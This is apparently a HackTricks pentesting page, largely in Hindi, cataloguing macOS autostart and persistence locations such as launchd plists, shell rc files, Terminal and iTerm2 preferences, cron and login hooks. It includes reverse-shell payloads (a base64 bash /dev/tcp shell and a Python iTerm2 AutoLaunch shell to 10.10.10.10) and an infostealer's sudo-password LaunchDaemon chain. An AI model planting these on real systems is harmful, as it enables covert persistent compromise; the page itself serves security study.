# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

This section is heavily based on the blog series [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), the goal is to add **more Autostart Locations** (if possible), indicate **which techniques are still working** nowadays with latest version of macOS (13.4) and to specify the **permissions** needed.

## Sandbox Bypass

> [!TIP]
> यहाँ आप उन start locations को पा सकते हैं जो **sandbox bypass** के लिए उपयोगी हैं — ये आपको कुछ execute करने की अनुमति देते हैं बस उसे **किसी फाइल में लिखकर** और किसी बहुत ही **सामान्य** **क्रिया**, निश्चित **समय अवधि** या ऐसी **क्रिया** के होने का **इंतज़ार** करके जिसे आप आमतौर पर sandbox के अंदर बिना root permissions के कर सकते हैं।

### Launchd

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root required
- **`/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root required
- **`/System/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root required
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root required
- **`~/Library/LaunchAgents`**
- **Trigger**: Relog-in
- **`~/Library/LaunchDemons`**
- **Trigger**: Relog-in

> [!TIP]
> एक रोचक तथ्य के रूप में, **`launchd`** के पास Mach-o सेक्शन `__Text.__config` में एक embedded property list है जो अन्य प्रसिद्ध services को बताती है जिन्हें launchd को शुरू करना होता है। इसके अलावा, इन services में `RequireSuccess`, `RequireRun` और `RebootOnSuccess` जैसे फ़ील्ड हो सकते हैं, जो बताते हैं कि इन्हें चलाया जाना चाहिए और सफलतापूर्वक पूरा होना चाहिए।
>
> बेशक, इसे code signing के कारण modify नहीं किया जा सकता।

#### Description & Exploitation

**`launchd`** वह **पहला** **process** है जो startup पर OX S kernel द्वारा execute किया जाता है और shutdown पर अंतिम में खत्म होने वाला process भी यही होता है। इसका हमेशा **PID 1** होना चाहिए। यह process उन ASEP plists में बताई configurations को **read और execute** करेगा, जो निम्न locaties में हैं:

- `/Library/LaunchAgents`: Per-user agents जो admin द्वारा install किए जाते हैं
- `/Library/LaunchDaemons`: System-wide daemons जो admin द्वारा install किए जाते हैं
- `/System/Library/LaunchAgents`: Per-user agents जो Apple द्वारा प्रदान किए जाते हैं
- `/System/Library/LaunchDaemons`: System-wide daemons जो Apple द्वारा प्रदान किए जाते हैं

जब कोई user लॉग इन करता है तो `/Users/$USER/Library/LaunchAgents` और `/Users/$USER/Library/LaunchDemons` में स्थित plists logged user की permissions के साथ start हो जाते हैं।

agents और daemons के बीच मुख्य अंतर यह है कि agents यूज़र के लॉग इन होने पर load होते हैं जबकि daemons system startup पर load होते हैं (क्योंकि ऐसे services हैं जैसे ssh जिन्हें किसी भी user के सिस्टम तक पहुंचने से पहले चलाया जाना आवश्यक है)। साथ ही agents GUI उपयोग कर सकते हैं जबकि daemons को background में चलना होता है।
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
There are cases where an **agent needs to be executed before the user logins**, these are called **PreLoginAgents**. For example, this is useful to provide assistive technology at login. They can be found also in `/Library/LaunchAgents`(see [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) an example).

> [!TIP]
> New Daemons or Agents config files will be **loaded after next reboot or using** `launchctl load <target.plist>` It's **also possible to load .plist files without that extension** with `launchctl -F <file>` (however those plist files won't be automatically loaded after reboot).\
> It's also possible to **unload** with `launchctl unload <target.plist>` (the process pointed by it will be terminated),
>
> To **ensure** that there isn't **anything** (like an override) **preventing** an **Agent** or **Daemon** **from** **running** run: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

ऐसे मामले होते हैं जहाँ किसी **agent** को उपयोगकर्ता लॉगिन से पहले निष्पादित करने की आवश्यकता होती है, इन्हें **PreLoginAgents** कहा जाता है। उदाहरण के लिए, यह लॉगिन पर सहायक तकनीक प्रदान करने के लिए उपयोगी है। इन्हें `/Library/LaunchAgents` में भी पाया जा सकता है (देखें [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) एक उदाहरण)।

> [!TIP]
> नई Daemons या Agents की config फ़ाइलें **अगले reboot के बाद या** `launchctl load <target.plist>` का उपयोग करके लोड की जाएँगी। यह भी संभव है कि उस एक्सटेंशन के बिना .plist फ़ाइलें `launchctl -F <file>` के साथ लोड की जाएँ (हालाँकि वे plist फ़ाइलें reboot के बाद स्वतः लोड नहीं होंगी)।\
> इन्हें `launchctl unload <target.plist>` के साथ **अनलोड** भी किया जा सकता है (जिस प्रक्रिया की ओर यह इशारा करता है वह समाप्त कर दी जाएगी),
>
> यह **सुनिश्चित** करने के लिए कि वहाँ **कुछ भी** (जैसे एक override) किसी **Agent** या **Daemon** को **चलने** से **रोक नहीं रहा**, चलाएँ: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

वर्तमान उपयोगकर्ता द्वारा लोड किए गए सभी agents और daemons सूचीबद्ध करें:
```bash
launchctl list
```
#### उदाहरण: दुर्भावनापूर्ण LaunchDaemon श्रृंखला (पासवर्ड पुन: उपयोग)

एक हालिया macOS infostealer ने **captured sudo password** का पुन: उपयोग करके एक user agent और एक root LaunchDaemon स्थापित किया:

- एजेंट लूप को `~/.agent` में लिखें और इसे executable बनाएं।
- उस agent की ओर इशारा करते हुए `/tmp/starter` में एक plist बनाएं।
- चोरी किए गए पासवर्ड को `sudo -S` के साथ पुन: उपयोग करके इसे `/Library/LaunchDaemons/com.finder.helper.plist` में कॉपी करें, `root:wheel` सेट करें, और `launchctl load` से लोड करें।
- आउटपुट अलग करने के लिए एजेंट को चुपचाप `nohup ~/.agent >/dev/null 2>&1 &` के माध्यम से स्टार्ट करें।
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> यदि कोई plist किसी user के स्वामित्व में है, भले ही वह daemon system-wide फ़ोल्डरों में हो, तो **टास्क यूज़र के रूप में चलाया जाएगा** और root के रूप में नहीं। यह कुछ privilege escalation हमलों को रोक सकता है।

#### launchd के बारे में अधिक जानकारी

**`launchd`** वह **पहला** यूज़र-मोड प्रोसेस है जिसे **कर्नेल** से शुरू किया जाता है। प्रोसेस का आरंभ **सफल** होना चाहिए और यह **exit** या crash नहीं कर सकता। यह कुछ **killing signals** के खिलाफ भी **protected** है।

`launchd` द्वारा की जाने वाली पहली चीज़ों में से एक सभी daemons को **start** करना है, जैसे:

- **Timer daemons** जो समय के आधार पर निष्पादित होते हैं:
- atd (`com.apple.atrun.plist`): इसका `StartInterval` 30min है
- crond (`com.apple.systemstats.daily.plist`): `StartCalendarInterval` को 00:15 पर शुरू होने के लिए सेट किया गया है
- **Network daemons** जैसे:
- `org.cups.cups-lpd`: TCP में listen करता है (`SockType: stream`) और `SockServiceName: printer` है
- `SockServiceName` या तो किसी port का नाम होना चाहिए या `/etc/services` की किसी service का नाम
- `com.apple.xscertd.plist`: TCP पर पोर्ट 1640 में listen करता है
- **Path daemons** जो तब निष्पादित होते हैं जब एक निर्दिष्ट path बदलता है:
- `com.apple.postfix.master`: पथ `/etc/postfix/aliases` की जाँच करता है
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: `MachServices` एंट्री में `com.apple.xscertd.helper` नाम दर्शाता है
- **UserEventAgent:**
- यह पिछले वाले से अलग है। यह specific events के जवाब में launchd को apps spawn करने पर प्रेरित करता है। हालांकि, इस मामले में मुख्य binary `launchd` नहीं है बल्कि `/usr/libexec/UserEventAgent` है। यह SIP-रिस्ट्रिक्टेड फ़ोल्डर /System/Library/UserEventPlugins/ से plugins लोड करता है, जहाँ प्रत्येक plugin अपने initializer को `XPCEventModuleInitializer` key में दर्शाता है या पुराने plugins के मामले में, अपने `Info.plist` की `CFPluginFactories` dict में `FB86416D-6164-2070-726F-70735C216EC0` key के अंतर्गत बताता है।

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- sandbox बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- लेकिन आपको ऐसा कोई app ढूँढना होगा जिसमें TCC bypass हो और जो एक shell execute करे जो ये फाइलें लोड करे

#### स्थान

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: zsh के साथ एक terminal खोलें
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: zsh के साथ एक terminal खोलें
- Root required
- **`~/.zlogout`**
- **Trigger**: zsh वाला terminal exit करने पर
- **`/etc/zlogout`**
- **Trigger**: zsh वाला terminal exit करने पर
- Root required
- संभवतः अधिक: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: bash के साथ एक terminal खोलें
- `/etc/profile` (didn't work)
- `~/.profile` (didn't work)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: xterm से ट्रिगर होने की उम्मीद थी, पर यह **installed नहीं है** और इंस्टॉल करने के बाद भी यह त्रुटि आती है: xterm: `DISPLAY is not set`

#### विवरण और शोषण

जब किसी shell वातावरण जैसे कि `zsh` या `bash` को प्रारंभ किया जाता है, तो **कुछ startup फाइलें चलाई जाती हैं**। macOS वर्तमान में डिफ़ॉल्ट shell के रूप में `/bin/zsh` का उपयोग करता है। यह shell Terminal application लॉन्च करने पर या SSH के माध्यम से डिवाइस एक्सेस किए जाने पर स्वचालित रूप से उपयोग होता है। जबकि `bash` और `sh` भी macOS में मौजूद हैं, उन्हें उपयोग के लिए स्पष्ट रूप से invoke करना होगा।

`zsh` का man पृष्ठ, जिसे हम **`man zsh`** से पढ़ सकते हैं, startup फाइलों का विस्तृत विवरण देता है।
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### पुनः खोलने वाले एप्लिकेशन

> [!CAUTION]
> निर्दिष्ट exploitation को कॉन्फ़िगर करना और loging-out तथा loging-in या यहाँ तक कि rebooting भी मेरे लिए app को execute करने के लिए काम नहीं आया। (App execute नहीं हो रही थी, शायद इन क्रियाओं के दौरान यह पहले से running होना चाहिए)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: Restart पर applications का पुनः खुलना

#### Description & Exploitation

पुनः खोलने के लिए सभी applications plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` के अंदर होते हैं

तो, reopen होने वाले applications को अपना app लॉन्च करवाइए — इसके लिए आपको बस **अपना app सूची में जोड़ना** है।

UUID उस डायरेक्टरी को list करके या `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` के साथ पाया जा सकता है

जिन applications को पुनः खोला जाएगा उन्हें जांचने के लिए आप कर सकते हैं:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
**इस सूची में एक एप्लिकेशन जोड़ने के लिए** आप उपयोग कर सकते हैं:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal प्राथमिकताएँ

- sandbox को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC बायपास: [✅](https://emojipedia.org/check-mark-button)
- Terminal का उपयोग करने पर इसे उपयोगकर्ता के FDA permissions मिल सकते हैं

#### स्थान

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **ट्रिगर**: Terminal खोलना

#### विवरण & Exploitation

Applications में उपयोगकर्ता की प्राथमिकताएँ **`~/Library/Preferences`** में संग्रहीत होती हैं। इनमें से कुछ प्राथमिकताएँ अन्य applications/scripts को **execute** करने की configuration रख सकती हैं।

उदाहरण के लिए, Terminal Startup में एक command execute कर सकता है:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

यह config फ़ाइल **`~/Library/Preferences/com.apple.Terminal.plist`** में इस प्रकार दिखाई देता है:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
तो, यदि सिस्टम में terminal के preferences की plist को overwrite किया जा सके, तो **`open`** फ़ंक्शन का उपयोग करके **open the terminal and that command will be executed** किया जा सकता है।

आप इसे cli से जोड़ सकते हैं:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal स्क्रिप्ट / अन्य फ़ाइल एक्सटेंशंस

- Sandbox को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- जब उपयोगकर्ता Terminal का उपयोग करता है तो Terminal के पास उपयोगकर्ता के FDA permissions होते हैं

#### स्थान

- **Anywhere**
- **ट्रिगर**: Terminal खोलना

#### विवरण & Exploitation

अगर आप एक [**`.terminal`** स्क्रिप्ट](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) बनाते हैं और उसे खोलते हैं, तो **Terminal application** स्वतः सक्रिय होकर वहां दिए गए कमांड्स को चलाएगा। यदि Terminal app के पास कुछ विशेष विशेषाधिकार हैं (जैसे TCC), तो आपका कमांड उन विशेषाधिकारों के साथ चलाया जाएगा।

इसे आज़माएँ:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
आप एक्सटेंशन्स **`.command`**, **`.tool`** का भी उपयोग कर सकते हैं — इनमें सामान्य shell scripts की सामग्री होगी और इन्हें Terminal द्वारा खोला जाएगा।

> [!CAUTION]
> यदि Terminal के पास **Full Disk Access** है तो यह क्रिया पूरी हो सकेगी (नोट: निष्पादित कमांड एक terminal विंडो में दिखाई देगा)।

### ऑडियो प्लगइन्स

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- sandbox को bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- आपको कुछ अतिरिक्त TCC access मिल सकता है

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
- Root required
- **Trigger**: coreaudiod या कंप्यूटर को Restart करने पर
- **`/Library/Audio/Plug-ins/Components`**
- Root required
- **Trigger**: coreaudiod या कंप्यूटर को Restart करने पर
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: coreaudiod या कंप्यूटर को Restart करने पर
- **`/System/Library/Components`**
- Root required
- **Trigger**: coreaudiod या कंप्यूटर को Restart करने पर

#### Description

पिछले writeups के अनुसार कुछ audio plugins को compile करके उन्हें load कराना संभव है।

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- sandbox को bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- आपको कुछ अतिरिक्त TCC access मिल सकता है

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

QuickLook plugins तब execute हो सकते हैं जब आप किसी फाइल का preview ट्रिगर करते हैं (Finder में फाइल select करके space बार दबाएँ) और उस फाइल टाइप को सपोर्ट करने वाला कोई plugin इंस्टॉल हो।

आप अपना QuickLook plugin compile करके उसे ऊपर बताई गई किसी लोकेशन में रखकर लोड करा सकते हैं, फिर किसी सपोर्टेड फाइल पर जाकर space दबाकर उसे ट्रिगर कर सकते हैं।

### ~~Login/Logout Hooks~~

> [!CAUTION]
> यह मेरे पास काम नहीं किया, न तो user LoginHook के साथ और न ही root LogoutHook के साथ

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- sandbox को bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- आपको ऐसा कुछ execute करने में सक्षम होना चाहिए: `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

वे deprecated हैं लेकिन इन्हें तब commands execute करने के लिए उपयोग किया जा सकता है जब कोई user लॉग इन करे।
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
यह सेटिंग `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` में संग्रहीत है
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
इसे हटाने के लिए:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
root user वाला फ़ाइल यहाँ संग्रहीत है: **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> यहाँ आप ऐसे start locations पा सकते हैं जो **sandbox bypass** के लिए उपयोगी हैं — ये आपको कुछ सरलता से execute करने देते हैं सिर्फ उसे **फ़ाइल में लिख कर** और कुछ कम-आम शर्तों की उम्मीद रख कर, जैसे कि विशिष्ट **प्रोग्राम इंस्टॉल्ड**, "uncommon" उपयोगकर्ता क्रियाएँ या विशेष वातावरण।

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- हालांकि, आपको `crontab` binary को execute करने में सक्षम होना चाहिए
- या root होना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Direct write access के लिए root आवश्यक है। अगर आप `crontab <file>` को execute कर सकते हैं तो root आवश्यक नहीं।
- **Trigger**: cron job पर निर्भर करता है

#### विवरण & Exploitation

वर्तमान **उपयोगकर्ता** के cron jobs को सूचीबद्ध करें:
```bash
crontab -l
```
आप उपयोगकर्ताओं के सभी cron jobs को **`/usr/lib/cron/tabs/`** और **`/var/at/tabs/`** में देख सकते हैं (root की आवश्यकता)।

MacOS में कई ऐसे फ़ोल्डर मिलते हैं जो scripts को **निश्चित अंतराल** पर चलाते हैं:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
वहाँ आप नियमित **cron** **jobs**, **at** **jobs** (बहुत अधिक उपयोग नहीं होते) और **periodic** **jobs** (मुख्यतः अस्थायी फ़ाइलें साफ़ करने के लिए) पा सकते हैं। दैनिक periodic jobs को उदाहरण के लिए इस तरह चलाया जा सकता है: `periodic daily`.

एक **user cronjob programatically** जोड़ने के लिए आप निम्न का उपयोग कर सकते हैं:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 पहले TCC permissions प्राप्त किया करता था

#### स्थान

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **ट्रिगर**: iTerm खोलें
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **ट्रिगर**: iTerm खोलें
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **ट्रिगर**: iTerm खोलें

#### विवरण और Exploitation

Scripts जो **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** में रखे गए हैं, निष्पादित होंगे। उदाहरण:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
या:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
स्क्रिप्ट **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** भी निष्पादित किया जाएगा:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
iTerm2 की preferences जो **`~/Library/Preferences/com.googlecode.iterm2.plist`** में स्थित हैं, iTerm2 terminal खुलने पर **एक कमांड चलाने का संकेत** दे सकती हैं।

यह सेटिंग iTerm2 settings में कॉन्फ़िगर की जा सकती है:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

और यह कमांड preferences में दिखाई देती है:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
आप चलाने के लिए कमांड इस तरह सेट कर सकते हैं:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> अत्यधिक संभव है कि arbitrary commands चलाने के लिए iTerm2 की **preferences** का दुरुपयोग करने के और भी तरीके मौजूद हों।

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- sandbox को बायपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- लेकिन xbar को इंस्टॉल होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- यह Accessibility permissions की मांग करता है

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: xbar के चलने पर

#### Description

यदि लोकप्रिय प्रोग्राम [**xbar**](https://github.com/matryer/xbar) इंस्टॉल है, तो **`~/Library/Application\ Support/xbar/plugins/`** में एक shell script लिखना संभव है, जिसे xbar के शुरू होते ही चलाया जाएगा:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- But Hammerspoon must be installed
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- यह Accessibility permissions की अनुमति मांगता है

#### स्थान

- **`~/.hammerspoon/init.lua`**
- **ट्रिगर**: Hammerspoon के चलने पर

#### विवरण

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) एक ऑटोमेशन प्लेटफ़ॉर्म है **macOS** के लिए, जो अपने संचालन के लिए **LUA scripting language** का उपयोग करता है। विशेष रूप से, यह पूरा AppleScript कोड एकीकृत करने और shell scripts के निष्पादन का समर्थन करता है, जिससे इसकी scripting क्षमताएँ काफी बढ़ जाती हैं।

ऐप एक ही फ़ाइल, `~/.hammerspoon/init.lua`, की तलाश करता है, और शुरू होने पर वह स्क्रिप्ट निष्पादित कर दी जाएगी।
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- sandbox को bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- लेकिन BetterTouchTool इंस्टॉल होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- यह Automation-Shortcuts और Accessibility permissions का अनुरोध करता है

#### स्थान

- `~/Library/Application Support/BetterTouchTool/*`

This tool applications या scripts को indicate करने की अनुमति देता है जिन्हें कुछ shortcuts दबाए जाने पर execute किया जाए। एक attacker अपनी खुद की **shortcut and action to execute in the database** configure कर सकता है ताकि वह arbitrary code execute करवा सके (एक shortcut सिर्फ किसी key को दबाने का भी हो सकता है)।

### Alfred

- sandbox को bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- लेकिन Alfred इंस्टॉल होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- यह Automation, Accessibility और यहां तक कि Full-Disk access permissions का अनुरोध करता है

#### स्थान

- `???`

यह workflows बनाने की अनुमति देता है जो कुछ conditions पूरा होने पर code execute कर सकते हैं। संभावित रूप से एक attacker एक workflow file बना कर Alfred को उसे load करने के लिए मजबूर कर सकता है (workflows का उपयोग करने के लिए premium version खरीदना आवश्यक है)।

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- sandbox को bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- लेकिन ssh को सक्षम कर के उपयोग में होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH में FDA access होता था

#### स्थान

- **`~/.ssh/rc`**
- **Trigger**: Login via ssh
- **`/etc/ssh/sshrc`**
- Root required
- **Trigger**: Login via ssh

